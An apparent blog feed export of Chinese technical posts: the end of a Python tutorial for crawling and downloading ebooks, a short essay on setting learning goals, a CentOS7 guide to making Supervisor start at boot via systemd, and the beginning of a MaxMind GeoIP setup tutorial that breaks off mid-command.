class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">获取书籍列表</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbookslist</span><span class="params">(bookurlstr,categroy_path)</span>:</span></span><br><span class="line">    book_result=requests.get(bookurlstr,headers=headers)</span><br><span class="line">    bookhtmlstr=book_result.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    soup = BeautifulSoup(bookhtmlstr, <span class="string">'lxml'</span>)</span><br><span class="line">    booklists=soup.select(<span class="string">'.channel-item'</span>)</span><br><span class="line">    <span class="keyword">for</span> bookinfo_div <span class="keyword">in</span> booklists:</span><br><span class="line">        booktitle_div=bookinfo_div.select(<span class="string">'.list-title'</span>)[<span class="number">0</span>]</span><br><span class="line">        bookurl=booktitle_div.a.attrs[<span class="string">'href'</span>]</span><br><span class="line">        getbookdetail(bookurl,categroy_path)</span><br><span class="line">    next_pag=soup.find(name=<span class="string">'a'</span>,text=re.compile(<span class="string">'下一页'</span>))</span><br><span class="line">    <span class="keyword">if</span> next_pag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        next_url=next_pag.attrs[<span class="string">'href'</span>]</span><br><span class="line">        print(<span class="string">'爬取下一页：'</span>+next_url)</span><br><span class="line">        getbookslist(next_url,categroy_path)</span><br></pre></td></tr></table></figure><h1 id="三、获取书籍详情页"><a href="#三、获取书籍详情页" class="headerlink" title="三、获取书籍详情页"></a>三、获取书籍详情页</h1><p>我们要在书籍详情页需要获得书籍详情信息包括书名、作者等信息<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E8%8E%B7%E5%8F%96%E4%B9%A6%E7%B1%8D%E8%AF%A6%E6%83%85.png" alt="书籍详情"><br>关于书名和作者可以分别通过提取class=”news_title”的h1标签和id=”news_details”的div下的ul下的li再通过正则表达式对作者信息进行提取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">booktitle=bookdetailsoup.select(<span class="string">'.news_title'</span>)[<span class="number">0</span>].text.strip()</span><br><span class="line">bookauthor=bookdetailsoup.select(<span class="string">'#news_details'</span>)[<span class="number">0</span>].ul.li.find(text=re.compile(<span class="string">'作者：(.*?)'</span>)).strip()</span><br><span class="line">bookauthor=bookauthor.replace(<span class="string">'作者：'</span>,<span class="string">''</span>)</span><br><span class="line">booktitleinfo=<span class="string">"《"</span>+booktitle+<span class="string">'》-'</span>+bookauthor</span><br></pre></td></tr></table></figure><h1 id="四、分析书籍详情页的资源地址"><a href="#四、分析书籍详情页的资源地址" class="headerlink" title="四、分析书籍详情页的资源地址"></a>四、分析书籍详情页的资源地址</h1><p>在书籍详情页，我们还要分析书籍详情页的资源地址<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%BA%90%E5%9C%B0%E5%9D%80.png" alt="资源地址"><br>电子书的资源下载地址可以通过提取a标签的信息来获取。通过正则表达式分别匹配azw3、mobi、epub分别提取不同的电子书资源。<br>book_url_item=bookdetailsoup.find(name=’a’,text=re.compile(booktype,re.I))<br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">根据书籍资源类型下载资源</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbookfortype</span><span class="params">(bookurl,categroy_path,bookdetailsoup,booktype)</span>:</span></span><br><span class="line">    booktitle=bookdetailsoup.select(<span class="string">'.news_title'</span>)[<span class="number">0</span>].text.strip()</span><br><span class="line">    bookauthor=bookdetailsoup.select(<span class="string">'#news_details'</span>)[<span class="number">0</span>].ul.li.find(text=re.compile(<span class="string">'作者：(.*?)'</span>)).strip()</span><br><span class="line">    bookauthor=bookauthor.replace(<span class="string">'作者：'</span>,<span class="string">''</span>)</span><br><span class="line">    booktitleinfo=<span class="string">"《"</span>+booktitle+<span class="string">'》-'</span>+bookauthor</span><br><span class="line">    print(<span class="string">'书籍详情：---'</span>+booktitleinfo)</span><br><span class="line">    book_url_item=bookdetailsoup.find(name=<span class="string">'a'</span>,text=re.compile(booktype,re.I))</span><br><span class="line">    <span class="keyword">if</span> book_url_item <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        downloadurl=book_url_item.attrs[<span class="string">'href'</span>]</span><br><span class="line">        print(<span class="string">'下载地址：'</span>+downloadurl)</span><br><span class="line">        <span class="keyword">if</span> checkIfNoExistBookByUrl(downloadurl):</span><br><span class="line">            r = requests.get(downloadurl)</span><br><span class="line">            <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">                savepath=createdir(categroy_path,booktitleinfo)</span><br><span class="line">                filename=booktitle+<span class="string">"."</span>+booktype</span><br><span class="line">                savebook(r.content,savepath,filename)</span><br><span class="line">                p,f=os.path.split(categroy_path)</span><br><span class="line">                bookcategory=f</span><br><span class="line">                book=Book(bookcategory,booktitle,bookauthor,bookurl,downloadurl,savepath,<span class="string">"苦瓜书盘"</span>,booktype)</span><br><span class="line">                print(book.toString())</span><br><span class="line">                savebooktojson(book)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'下载失败：status_code='</span>+str(r.status_code))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'没有'</span>+booktype+<span class="string">'格式的书'</span>)</span><br></pre></td></tr></table></figure><p>五、下载并保存<br>有了资源的下载资源后下载就变得很简单了，主要用python的os库，对文件进行操作，包括建目录及保存资源文件。也可以通过连接数据库将爬取的数据保存到数据库。<br>定义书籍类Book用于组织和保存数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,bookcategory,bookname,bookauthor,bookurl,bookdownloadurl,booksavepath,booksource,booktype)</span>:</span></span><br><span class="line">        self.bookcategory=bookcategory</span><br><span class="line">        self.bookname=bookname</span><br><span class="line">        self.bookauthor=bookauthor</span><br><span class="line">        self.bookurl=bookurl</span><br><span class="line">        self.bookdownloadurl=bookdownloadurl</span><br><span class="line">        self.booksavepath=booksavepath</span><br><span class="line">        self.booksource=booksource</span><br><span class="line">        self.booktype=booktype</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">toString</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"bookcategory"</span>:self.bookcategory,<span class="string">"bookname"</span>:self.bookname,<span class="string">"bookauthor"</span>:self.bookauthor,<span class="string">"bookurl"</span>:self.bookurl,<span class="string">"bookdownloadurl"</span>:self.bookdownloadurl,<span class="string">"booksavepath"</span>:self.booksavepath,<span class="string">"booksource"</span>:self.booksource,<span class="string">"booktype"</span>:self.booktype&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">将获取的信息保存至文件</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">savebooktojson</span><span class="params">(book)</span>:</span></span><br><span class="line">    bookdata=&#123;</span><br><span class="line">        <span class="string">'booksource'</span>:book.booksource,</span><br><span class="line">        <span class="string">'booktype'</span>:book.booktype,</span><br><span class="line">        <span class="string">'bookcategory'</span>:book.bookcategory,</span><br><span class="line">        <span class="string">'bookname'</span>:book.bookname,</span><br><span class="line">        <span class="string">'bookauthor'</span>:book.bookauthor,</span><br><span class="line">        <span class="string">'bookurl'</span>:book.bookurl,</span><br><span class="line">        <span class="string">'bookdownloadurl'</span>:book.bookdownloadurl,</span><br><span class="line">        <span class="string">'booksavepath'</span>:book.booksavepath</span><br><span class="line">    &#125;</span><br><span class="line">    bookjson=json.dumps(bookdata,ensure_ascii=<span class="literal">False</span>) <span class="comment">#ensure_ascii=False 就不会用 ASCII 编码，中文就可以正常显示了</span></span><br><span class="line">    print(bookjson)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data.json'</span>, <span class="string">'a'</span>,encoding=<span class="string">'gbk'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(bookjson+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">根据目录创建文件夹</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createdir</span><span class="params">(savepath,dir)</span>:</span></span><br><span class="line">    path=os.path.join(savepath,dir)</span><br><span class="line">    isExists=os.path.exists(path)</span><br><span class="line">    <span class="keyword">if</span> isExists:</span><br><span class="line">        print(<span class="string">'已经存在'</span>+dir)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'创建目录'</span>+dir)</span><br><span class="line">        os.mkdir(path)</span><br><span class="line">    <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">下载书籍资源</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">savebook</span><span class="params">(content,savepath,savefilename)</span>:</span></span><br><span class="line">    savefile=os.path.join(savepath,savefilename)</span><br><span class="line">    <span class="keyword">with</span> open(savefile, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">       code.write(content)</span><br></pre></td></tr></table></figure><hr><p>运行效果如下：</p><p>1、爬取过程<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E7%88%AC%E5%8F%96%E8%BF%87%E7%A8%8B.png" alt="爬取过程"><br>2、爬取记录的json信息<br>data.json的信息如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E7%88%AC%E5%8F%96%E8%AE%B0%E5%BD%95%E7%9A%84json%E4%BF%A1%E6%81%AF.png" alt="爬取记录"><br>3、爬取获取的资源<br>按目录都已经整理好了，够你看的了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E8%8E%B7%E5%8F%96%E7%9A%84%E8%B5%84%E6%BA%90.png" alt="获取的资源"></p><p>​<br>Python爬虫获取电子书资源实战的全部代码，包括爬取-&gt;分析、解析-&gt;保存至本地及数据库。<a href="https://download.csdn.net/download/fullbug/10468606" target="_blank" rel="noopener">下载</a></p><p>​<strong>github:</strong> <a href="https://github.com/xiejava1018/getbooks" target="_blank" rel="noopener">https://github.com/xiejava1018/getbooks</a></p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你有了一个目标，于是你有了一堆技能，而不是反过来！</title>
      <link href="/posts/e6daf5ca/"/>
      <url>/posts/e6daf5ca/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211116/%E7%9B%AE%E6%A0%87.png" alt="目标"></p><p><strong>你有了一个目标，于是你有了一堆技能。而不是反过来！</strong><br>这应该是这段时间我领悟最深刻的一句话，是从白帽汇-赵武的微信文章中看到的。<br>我的体会是，<strong>没有一个清晰的为之努力奋斗的目标而去学东西，很难获得效果</strong>。</p><p>老实说，我并不是个懒惰的人，知道要不断的去学习、看书，来努力提升自己，但是几年下来自己的个人成长确是非常的有限，原因就是目标不明确。尤其是随着年龄的增大，面对越来越大的压力，越来越焦虑。焦虑是因为面对残酷的社会竞争压力以及对自身能力的不自信。所以很多东西都想学，机器学习、网络安全、英语、写作等等。没有明确的目标和整体的规划，只知道要学，桌上摆了很多书，今天看几页这本书，明天翻几页那本书，看上去天天在看书，实际上一本书都没有看进去。看英语的时候在想应该多花点时间看看专业书，看专业书的时候在想英语也很重要，要不看会英语。实际就是有限的时间精力和无限的需要学习的知识之间的矛盾。还有一个突出的问题就是没有明确的目标就会没有成就感，尤其是专业领域，看了很多书，不能学以致用，看了就忘，感觉就是学了个寂寞。</p><p>学习，目标非常重要，没有明确目标的学习到头来都是浪费时间。学习效果好、状态好的往往是带着明确的目标去学的。记得我才参加工作的时候做网页开发那时候啥都不懂，我的目标就是想成为一名真正的程序员。那时候BBS和聊天室很火，就想自己能够写一个BBS和聊天室，于是自己学Java、 jsp、HTML、javascript、数据库等。那时候上外网还比较奢侈，自己写了一个聊天室放到公司内网，公司几十百把号人玩得不亦乐乎。大家玩聊天室的时候还不断的给我提建议提需求，我白天上班，晚上改我的聊天室代码。看着自己的成果被别人用心里挺开心的。那段时间感觉自己成长很快，学到了很多东西。很快成为了公司主力程序员。还有个例子就是有段时间想学英语，给自己定的目标就是看完全套的《书虫》，有了目标后每天坚持看几十页，花了几个月的时间把全套的149本书虫给看完了。自己感觉还是非常的好，英语阅读能力有了一定的提升。但是这个目标实现了以后，没有重新给自己制定新的目标，所以自己的英语水平一直没有达到自己理想的状态。应该规划好终极目标、长期目标、阶段性目标，通过实现一个个小目标最终达到自己理想的终极目标。</p><p>懂得了很多大道理依旧无法过好这一生，其实就是没有一个明确的人生目标，没有一个让自己为之奋斗的目标，目标感强的人往往都会比较成功。可以说项目管理也好，个人管理也好，归根到底都是目标管理。为了实现目标、投入时间、金钱、精力等各种已有的资源，用各种手段，思考各种方法来达到目标。</p><p><strong>定方向、定目标非常重要！</strong></p><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7下配置Supervisor自启动的两种方法</title>
      <link href="/posts/4ba25d97/"/>
      <url>/posts/4ba25d97/</url>
      
        <content type="html"><![CDATA[<p>很多网友留言问如何配置Supervisor 自启动，现将如何在CentOS7下配置Supervisor自启动的两种方法整理如下：</p><h1 id="一、方法一"><a href="#一、方法一" class="headerlink" title="一、方法一"></a>一、方法一</h1><p><strong>直接将启动命令加入到/etc/rc.d/rc.local中（简单但不推荐）</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p>在现有的内容后面加入supervisor的启动命令<br>supervisord -c /etc/supervisord.conf<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211111/rc.local.png" alt="/etc/rc.d/rc.local"><br>注意：一定要执行 chmod +x /etc/rc.d/rc.local</p><blockquote><p>chmod +x /etc/rc.d/rc.local</p></blockquote><p>给文件加入可执行权限<br>根据官方的提示，该方式是不被建议的，强烈建议创建自己的systemd services或udev规则来启动自已的应用，也就是方法二。</p><h1 id="二、方法二"><a href="#二、方法二" class="headerlink" title="二、方法二"></a>二、方法二</h1><p><strong>通过创建systemd services来实现自启动 （推荐）</strong><br>进入到/usr/lib/systemd/system/目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cd /usr/lib/systemd/system/</span></span><br></pre></td></tr></table></figure><p>找到supervisord及supervisorctl命令的路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">system</span>]<span class="comment"># which supervisord</span></span><br><span class="line">/usr/local/bin/supervisord</span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">system</span>]<span class="comment"># which supervisorctl</span></span><br><span class="line">/usr/local/bin/supervisorctl</span><br></pre></td></tr></table></figure><h2 id="创建文件supervisord-service"><a href="#创建文件supervisord-service" class="headerlink" title="创建文件supervisord.service"></a>创建文件supervisord.service</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi supervisord.service</span><br></pre></td></tr></table></figure><p>复制以下代码。注意：supervisord及supervisorctl命令的路径根据实际情况进行修改</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#supervisord.service</span></span><br><span class="line"></span><br><span class="line">[<span class="type">Unit</span>]</span><br><span class="line">Description=Supervisor daemon</span><br><span class="line"></span><br><span class="line">[<span class="type">Service</span>]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/local/bin/supervisord <span class="literal">-c</span> /etc/supervisord.conf</span><br><span class="line">ExecStop=/usr/local/bin/supervisorctl shutdown</span><br><span class="line">ExecReload=/usr/local/bin/supervisorctl reload</span><br><span class="line">KillMode=<span class="keyword">process</span></span><br><span class="line">Restart=on<span class="literal">-failure</span></span><br><span class="line">RestartSec=<span class="number">42</span>s</span><br><span class="line"></span><br><span class="line">[<span class="type">Install</span>]</span><br><span class="line">WantedBy=multi<span class="literal">-user</span>.target</span><br></pre></td></tr></table></figure><h2 id="启用服务"><a href="#启用服务" class="headerlink" title="启用服务"></a>启用服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">system</span>]<span class="comment"># systemctl enable supervisord</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi<span class="literal">-user</span>.target.wants/supervisord.service to /usr/lib/systemd/system/supervisord.service</span><br></pre></td></tr></table></figure><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># systemctl start supervisord</span></span><br></pre></td></tr></table></figure><h2 id="查看服务状态"><a href="#查看服务状态" class="headerlink" title="查看服务状态"></a>查看服务状态</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># systemctl status supervisord</span></span><br><span class="line">● supervisord.service - Supervisor daemon</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/supervisord.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu <span class="number">2021</span><span class="literal">-11</span><span class="literal">-11</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">36</span> CST; <span class="number">12</span>s ago</span><br><span class="line">  <span class="keyword">Process</span>: <span class="number">3822</span> ExecStart=/usr/local/bin/supervisord <span class="literal">-c</span> /etc/supervisord.conf (code=exited, status=<span class="number">0</span>/SUCCESS)</span><br><span class="line"> Main PID: <span class="number">3850</span> (supervisord)</span><br><span class="line">   CGroup: /system.slice/supervisord.service</span><br><span class="line">           ├─<span class="number">3850</span> /usr/local/bin/python3.<span class="number">8</span> /usr/local/bin/supervisord <span class="literal">-c</span> /etc/supervisord.conf</span><br><span class="line">           ├─<span class="number">3916</span> uwsgi -<span class="literal">-ini</span> /home/flask_web/uwsgi.ini</span><br><span class="line">           ├─<span class="number">3918</span> uwsgi -<span class="literal">-ini</span> /home/flask_web/uwsgi.ini</span><br><span class="line">           └─<span class="number">3919</span> uwsgi -<span class="literal">-ini</span> /home/flask_web/uwsgi.ini</span><br></pre></td></tr></table></figure><h2 id="验证一下是否为开机启动"><a href="#验证一下是否为开机启动" class="headerlink" title="验证一下是否为开机启动"></a>验证一下是否为开机启动</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">system</span>]<span class="comment"># systemctl is-enabled supervisord</span></span><br><span class="line">enabled</span><br></pre></td></tr></table></figure><p>reboot重启服务器后，可以发现supervisor随服务器启动后自动启动了。</p><p><strong>至此，本文介绍了CentOS7下配置Supervisor自启动的两种方法，推荐使用第二种方式。</strong></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python通过GeoIP获取IP信息（国家、城市、经纬度等）</title>
      <link href="/posts/2c5697c0/"/>
      <url>/posts/2c5697c0/</url>
      
        <content type="html"><![CDATA[<p>IP地址信息是非常重要的情报信息，通过IP可以定位到该IP所在的国家、城市、经纬度等。<br>获取IP信息的方式有很多，很多服务商都提供了相应的地址库或API接口服务。<br>如国内的ipip.net，国外的ip-api.com、maxmind.com等。<br>很多公司都是使用Maxmind网站的IP信息库，里面包含着IP的详细信息，有付费的也有免费的，收费与免费的区别就是精准度和覆盖率。</p><p>本文介绍下载及定时更新Maxmind的离线库用python通过GeoIP来获取IP信息 </p><h1 id="一、下载GeoLite2离线地址库"><a href="#一、下载GeoLite2离线地址库" class="headerlink" title="一、下载GeoLite2离线地址库"></a>一、下载GeoLite2离线地址库</h1><h2 id="1、注册及申请License-Key"><a href="#1、注册及申请License-Key" class="headerlink" title="1、注册及申请License Key"></a>1、注册及申请License Key</h2><p>下载地址库之前先要在Maxmind网站注册同意相应的协议并登陆。</p><h3 id="1）注册"><a href="#1）注册" class="headerlink" title="1）注册"></a>1）注册</h3><p>访问 <a href="https://dev.maxmind.com/geoip/geolite2-free-geolocation-data" target="_blank" rel="noopener">https://dev.maxmind.com/geoip/geolite2-free-geolocation-data</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/Maxmind%E6%B3%A8%E5%86%8C%E5%AF%BC%E8%88%AA%E9%A1%B5.png" alt="Maxmiand注册导航"><br>点击”Sign Up for GeoLite2” 根据输入框进行注册<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/Maxmind%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8D%95%E9%A1%B5.png" alt="Maxmiand注册表单"><br>注意邮箱一定要正确，注册后会发邮件进行确认及修改密码。<br>根据注册的用户名和修改后的密码登陆就可以直接下载离线包了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/Maxmind%E8%B4%A6%E5%8F%B7%E6%A6%82%E8%A7%88.png" alt="Maxmind账号信息"><br>点击”Download Databases”进入到下载页面，可以看到提供了CSV及mmdb两种格式的离线库包，最近的更新时间为2021年11月02日。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/%E5%9C%B0%E5%9D%80%E5%BA%93%E4%B8%8B%E8%BD%BD.png" alt="MaxmiandGeoLite2地址库下载"><br>由于IP地址信息是经常有变化的，Maxmind提供了geoipupdate工具来更新离线地址包。该工具使用需要申请账号和License Key</p><h3 id="2）申请License-Key"><a href="#2）申请License-Key" class="headerlink" title="2）申请License Key"></a>2）申请License Key</h3><p>还是通过刚注册的引导页面，点击“Generate a License Key”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/Maxmind%E7%94%9F%E6%88%90License%E5%AF%BC%E8%88%AA%E9%A1%B5.png" alt="Maxmind生成License导航页"><br>进如到页面后，点击“Generate new license key”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/Maxmind%E7%94%9F%E6%88%90Licensekey.png" alt="Generate new license key"><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/Maxmind%E7%94%9F%E6%88%90License2.png" alt="License Key生成确定页"><br>点击确定以后就会生成账号及License key<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/MaxmindLicense%E7%94%9F%E6%88%90%E9%A1%B5.png" alt="License key生成"></p><h2 id="2、下载并配置geoipupdate"><a href="#2、下载并配置geoipupdate" class="headerlink" title="2、下载并配置geoipupdate"></a>2、下载并配置geoipupdate</h2><p><a href="https://github.com/maxmind/geoipupdate" target="_blank" rel="noopener">https://github.com/maxmind/geoipupdate</a><br>这里有详细的安安装及配置说明</p><p>发行版本下载地址 <a href="https://github.com/maxmind/geoipupdate/releases" target="_blank" rel="noopener">https://github.com/maxmind/geoipupdate/releases</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/geoipupdate%E4%B8%8B%E8%BD%BD.png" alt="在这里插入图片描述"></p><p>可以看到提供了各种平台的版本的下载链接，这里我们下载安装的是linux版本，点击下载“geoipupdate_4.8.0_linux_amd64.tar.gz”<br>在home目录下执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/maxmind/geoipupdate/releases/download/v4.<span class="number">8.0</span>/geoipupdate_4.<span class="number">8.0</span>_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>下载至home目录</p><p>tar -zxvf geoipupdate_4.8.0_linux_amd64.tar.gz 进行解压<br>cd geoipupdate_4.8.0_linux_amd64  目录执行ls -alh查看目录内容，发现有两个关键文件，一个是getipupdate命令执行文件，一个是GeoIP.conf配置文件<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211110/geoipupdate%E7%9B%AE%E5%BD%95.png" alt="geoipupdate目录"></p><p>将执行命令拷贝到命令文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp geoipupdate /usr/<span 